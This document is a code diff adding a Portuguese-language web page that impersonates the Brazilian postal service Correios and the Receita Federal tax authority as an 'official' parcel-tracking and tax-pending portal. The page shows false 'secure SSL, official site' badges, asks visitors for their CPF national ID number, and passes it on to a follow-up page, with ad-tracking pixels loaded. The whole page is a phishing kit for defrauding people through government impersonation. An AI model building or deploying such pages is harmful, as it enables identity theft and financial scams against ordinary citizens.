@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <script src="assets/js/protect.js?v=20260814clear"></script>
+  <script src="assets/js/pixel-loader-utmify.js"></script>
+  <script src="assets/js/pixel-utmify.js"></script>
+  <meta name="theme-color" content="#0b2557">
+  <title>Rastreamento de Encomendas | Consulta Fiscal</title>
+  <link rel="stylesheet" href="assets/css/correios-mobile.css?v=20260814f">
+</head>
+<body>
+  <div class="page">
+    <header class="logo-bar">
+      <img src="assets/img/logo1.png" alt="Correios">
+    </header>
+
+    <div class="ssl-bar">
+      <span>🔒 Conexão Segura SSL • Site Oficial dos Correios</span>
+      <span class="check">✓</span>
+    </div>
+
+    <div class="content-wrap">
+      <div class="rf-card">
+        <div class="rf-left">
+          <img src="assets/img/logo2.png" alt="Receita Federal">
+          <span>Receita Federal</span>
+        </div>
+        <div class="rf-right">
+          <strong>Sistema Integrado</strong>
+          <span><span class="status-dot"></span>Online • Seguro</span>
+        </div>
+      </div>
+
+      <h1 class="page-title">Rastreamento de Encomendas</h1>
+      <p class="page-subtitle">Portal Oficial de Consulta Fiscal</p>
+
+      <div class="hero-card">
+        <div class="alert-box">
+          <div class="alert-icon">i</div>
+          <div class="alert-text">
+            <strong>AVISO IMPORTANTE</strong>
+            <p>Informe o CPF do titular da encomenda para verificar pendências fiscais vinculadas.</p>
+          </div>
+        </div>
+
+        <p class="instruction">Digite seu CPF abaixo para consultar encomendas e pendências fiscais.</p>
+
+        <form class="cpf-form" id="formCpf" onsubmit="return enviarConsulta()">
+          <label for="cpf">CPF do titular:</label>
+          <input
+            type="tel"
+            id="cpf"
+            name="cpf"
+            inputmode="numeric"
+            maxlength="14"
+            placeholder="000.000.000-00"
+            required
+            autocomplete="off"
+            oninput="mascararCPF(this)"
+          >
+          <button type="submit" class="btn-primary">
+            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+            CONSULTAR ENCOMENDAS AGORA
+          </button>
+        </form>
+
+        <p class="cpf-help">Seus dados são utilizados somente para consulta de pendências.</p>
+      </div>
+    </div>
+
+    <div class="footer-bar"></div>
+  </div>
+
+  <script>
+    function mascararCPF(campo) {
+      let valor = campo.value.replace(/\D/g, "");
+      if (valor.length > 11) valor = valor.slice(0, 11);
+      valor = valor.replace(/(\d{3})(\d)/, "$1.$2");
+      valor = valor.replace(/(\d{3})(\d)/, "$1.$2");
+      valor = valor.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+      campo.value = valor;
+    }
+
+    function buildRedirectUrl(path, updates) {
+      const nextParams = new URLSearchParams(window.location.search);
+      Object.keys(updates).forEach((key) => {
+        const value = updates[key];
+        if (value === null || value === undefined || value === "") {
+          nextParams.delete(key);
+          return;
+        }
+        nextParams.set(key, value);
+      });
+      const query = nextParams.toString();
+      return path + (query ? "?" + query : "");
+    }
+
+    function enviarConsulta() {
+      const cpf = document.getElementById("cpf").value.replace(/\D/g, "");
+      if (cpf.length !== 11) {
+        alert("Por favor, informe um CPF válido.");
+        return false;
+      }
+      window.location.href = buildRedirectUrl("index2.html", { cpf, codigo: null });
+      return false;
+    }
+  </script>
+</body>
+</html>
